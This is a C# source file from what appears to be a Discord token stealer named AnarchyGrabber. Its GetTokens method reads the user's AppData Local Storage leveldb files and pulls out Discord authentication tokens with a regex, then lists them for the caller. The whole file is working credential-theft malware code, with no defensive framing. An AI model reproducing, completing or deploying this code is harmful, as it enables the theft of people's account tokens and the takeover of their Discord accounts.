using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;
using System.Linq;

namespace AnarchyGrabber
{
    public static class Grabber
    {
        public static List<string> GetTokens(string dir, bool checkLogs = false)
        {
            List<string> tokens = new List<string>();

            try
            {
                DirectoryInfo leveldb = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) 
                                                          + @"\AppData\" 
                                                          + dir 
                                                          + @"\Local Storage\leveldb");

                foreach (var file in leveldb.GetFiles(checkLogs ? "*.log" : "*.ldb"))
                {
                    //looks for discord token patterns (yes my regex is shit shut up)
                    foreach (Match match in Regex.Matches(file.OpenText().ReadToEnd(), @"[\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-]\.[\w-][\w-][\w-][\w-][\w-][\w-]\.[\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-]"))
                            tokens.Add(match.Value);
                }
            }
            catch { }

            tokens = tokens.Distinct().ToList();

            if (tokens.Count > 0)
                tokens[tokens.Count - 1] += " - NEWEST";
            else
                tokens.Add("No tokens found");

            return tokens;
        }
    }
}
